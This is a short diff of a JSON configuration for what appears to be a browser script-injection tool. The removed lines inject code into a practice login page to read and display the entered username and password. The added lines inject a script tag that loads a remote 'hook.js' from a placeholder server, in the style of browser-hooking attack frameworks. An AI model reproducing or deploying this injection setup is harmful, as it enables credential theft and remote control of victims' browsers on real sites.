@@ -1,5 +1,5 @@
 {
-    "url": "https://practice.expandtesting.com/login",
+    "url": "https://a.com",
     "websites": {
         "*.example.com": {
             "scripts": [
@@ -24,12 +24,11 @@
         ]
     },
     "persistent": {
-      "scripts": [
-    "var btn_login = document.querySelector('#login > button');",
-    "var usernameField = document.querySelector('#username');",
-    "var passwordField = document.querySelector('#password');",
-    "if (btn_login && usernameField && passwordField) {btn_login.onclick = () => {alert(`username : ${usernameField.value} password : ${passwordField.value}`);};} else {console.error('Some elements were not found!');};"
-  ],
-        "status": true
+         "scripts": [
+            "var script = document.createElement('script');",
+            "script.src = 'http://your-server.com/hook.js';",
+            "document.head.appendChild(script);"
+        ],
+        "status": false
     }
 }
